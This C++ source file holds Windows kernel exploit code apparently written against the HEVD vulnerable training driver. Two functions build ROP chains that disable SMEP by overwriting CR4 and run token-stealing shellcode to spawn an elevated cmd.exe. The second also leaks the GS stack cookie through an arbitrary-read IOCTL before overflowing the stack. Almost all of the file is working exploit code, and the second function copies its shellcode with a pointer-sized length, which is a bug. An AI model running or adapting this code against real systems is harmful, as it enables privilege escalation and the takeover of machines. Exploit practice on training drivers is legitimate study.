#include "include/exp/stackoverflow.hpp"

namespace exploit
{
    namespace stackoverflow
    {
        //StackOverflow 
        // ON : SMEP
        // OFF: GS, KVAS
        void StackOverflow(HANDLE hDevice, unsigned int ioctl) {
            char stackspace[0x1000] = { 0 };
            const unsigned char* cmd = exploit::shellcode::SpawnTokenAllEnabled;
            size_t szSC = sizeof(exploit::shellcode::SpawnTokenAllEnabled);

            // allocate shellcode space
            printf("[*] Start Exploit\n");
            LPVOID shellcode_addr = VirtualAlloc(NULL,
                szSC,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            memcpy(shellcode_addr, cmd, szSC);

            // relocate gadget
            unsigned long long base = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");
            unsigned long long pop_rcx = base + exploit::gadget::X_19045_2006::pop_rcx_ret;
            unsigned long long mov_cr4_rcx = base + exploit::gadget::X_19045_2006::mov_cr4_rcx_ret;
            printf("[*] pop rcx; ret: %p\n   mov cr4, rcx; ret: %p\n", pop_rcx, mov_cr4_rcx);

            // assemble payload
            unsigned int size = 0x840;
            RtlFillMemory(stackspace, 0x810, 'A');
            printf("[*] Start set ROP\n");
            *(unsigned long long*)(stackspace + 0x818) = (unsigned long long)pop_rcx;
            //set RCX = currentRC4
            *(unsigned long long*)(stackspace + 0x820) = (unsigned long long)exploit::gadget::X_19045_2006::bypassSMEPVal;
            *(unsigned long long*)(stackspace + 0x828) = (unsigned long long)mov_cr4_rcx;
            *(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr;

            DWORD info = 0;
            printf("shellcode space %p\n", shellcode_addr);
            printf("[*] Spawning a new cmd.exe process\n");

            system("pause");

            DeviceIoControl(hDevice, ioctl,
                stackspace, size,
                NULL, 0,
                &info, NULL);
            printf("info: %d\n", info);
            system("cmd.exe");
        }


        //StackOverflowGS
        // ON : GS, SMEP
        // OFF: KVAS
        void StackOverflowGS(HANDLE hDevice, unsigned int ioctl) {
            char stackspace[0x1000] = { 0 };
            const unsigned char* cmd = exploit::shellcode::SpawnTokenAllEnabled;
            size_t szSC = sizeof(exploit::shellcode::SpawnTokenAllEnabled);
            DWORD oldProtect;

            printf("[*] Start Exploit\n");
            LPVOID shellcode_addr = VirtualAlloc(NULL,
                sizeof(cmd),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            memcpy(shellcode_addr, cmd, sizeof(cmd));

            //TODO:
            // ulGetStackLimit(L"HEVD_EXP.exe");
            funcaddr base = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");
            funcaddr pop_rcx = base + exploit::gadget::X_19045_2006::pop_rcx_ret;
            funcaddr mov_cr4_rcx = base + exploit::gadget::X_19045_2006::mov_cr4_rcx_ret;
            funcaddr hevd_base = exploit::memtools::ulGetKernelBase((PCHAR)"HEVD.sys");
            funcaddr cookie_addr = hevd_base + 0x3000;

            printf("[*] Cookie Address 0x%llx\n", cookie_addr);
            printf("[*] Atribute Write GET key value\n");
            typedef struct _WRITE_WHAT_WHERE
            {
                funcaddr* What;
                funcaddr* Where;
            }arbitrary_write, * pArbitraryWrite;
            funcaddr value = 0;
            pArbitraryWrite payload = (pArbitraryWrite)malloc(sizeof(arbitrary_write));
            payload->What = (funcaddr*)cookie_addr;
            payload->Where = &value;
            DWORD size = sizeof(payload);
            DWORD info = NULL;
            DeviceIoControl(hDevice, 0x22200B,
                payload, size,
                NULL, 0,
                &info, NULL);
            printf("[*] Key value 0x%llx\n", value);

            funcaddr rsp = 0;
            scanf_s("%llx", &rsp);
            rsp -= (0x868 + 0x258);
            printf("[*] RSP value 0x%llx\n", rsp);

            rsp ^= value;
            printf("[*] Cookie value 0x%llx\n", rsp);

            printf("[*] Start set ROP\n");
            //RtlFillMemory(stackspace, 0x238, 'A');
            RtlFillMemory(stackspace, 0x200, 'A');
            size = 0x258;
            *(funcaddr*)(stackspace + 0x200) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x208) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x210) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x218) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x220) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x228) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x230) = (funcaddr)rsp;
            *(funcaddr*)(stackspace + 0x238) = (funcaddr)pop_rcx;
            *(funcaddr*)(stackspace + 0x240) = (funcaddr)exploit::gadget::X_19045_2006::bypassSMEPVal;
            *(funcaddr*)(stackspace + 0x248) = (funcaddr)mov_cr4_rcx;
            *(funcaddr*)(stackspace + 0x250) = (funcaddr)shellcode_addr;

            printf("[*] Spawning a new cmd.exe process\n");
            system("pause");
            DeviceIoControl(hDevice, ioctl,
                stackspace, size,
                NULL, 0,
                &info, NULL);
            system("cmd.exe");
        }
    } // namespace stackoverflow

} // namespace exp
